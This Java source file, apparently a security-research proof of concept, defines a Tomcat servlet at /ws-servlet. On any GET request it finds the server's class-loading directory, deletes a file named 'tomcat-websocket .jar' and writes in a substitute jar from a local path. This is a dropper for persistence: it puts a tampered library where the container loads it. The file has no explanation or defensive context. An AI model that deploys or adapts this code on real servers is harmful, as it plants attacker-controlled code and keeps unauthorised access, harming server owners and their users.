package org.sec.tomcat;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

@WebServlet(name = "wsServlet", value = "/ws-servlet")
public class WsServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)
                    Thread.currentThread().getContextClassLoader();
            StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
            String path = standardCtx.getClass().getClassLoader().getResource("").toString();
            String finalPath = path.split("file:/")[1]+"tomcat-websocket .jar";
            if(Files.exists(Paths.get(finalPath))){
                Files.delete(Paths.get(finalPath));
            }
            byte[] data = Files.readAllBytes(Paths.get("C:/JavaCode/Tomcat/tomcat-websocket .jar"));
            Files.write(Paths.get(finalPath),data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
